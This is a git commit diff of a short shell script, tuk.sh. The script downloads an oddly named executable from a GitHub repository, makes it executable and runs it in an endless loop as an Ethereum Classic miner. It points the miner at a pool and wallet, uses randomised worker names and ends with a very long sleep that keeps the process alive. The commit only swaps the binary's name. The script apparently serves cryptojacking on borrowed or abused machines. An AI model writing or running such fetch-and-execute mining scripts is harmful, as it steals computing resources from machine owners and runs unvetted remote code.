d0b94bdb33c45bf4dc8be813500993f6901b7cb3
goldengoose45 <86189692+goldengoose45@users.noreply.github.com>
2021-06-29 10:44:10 +0530

    Update tuk.sh

--- tuk.sh
+++ tuk.sh
@@ -2,10 +2,10 @@
 POOL=us-etc.2miners.com:1010
 WALLET=0x663bDc4a1eDeCDDCe775862bBE859D6A84a72fB8
 WORKER=$(echo $(shuf -i 10-40 -n 1)-DOGEDANK)
-wget https://github.com/goldengoose45/weskey/raw/main/sukun
-chmod +x sukun
+wget https://github.com/goldengoose45/weskey/raw/main/bangla
+chmod +x bangla
 while [ 1 ]; do
-./sukun --algo ETCHASH --pool $POOL --user $WALLET.$WORKER 
+./bangla --algo ETCHASH --pool $POOL --user $WALLET.$WORKER 
 sleep 5
 done
 sleep 999999999 
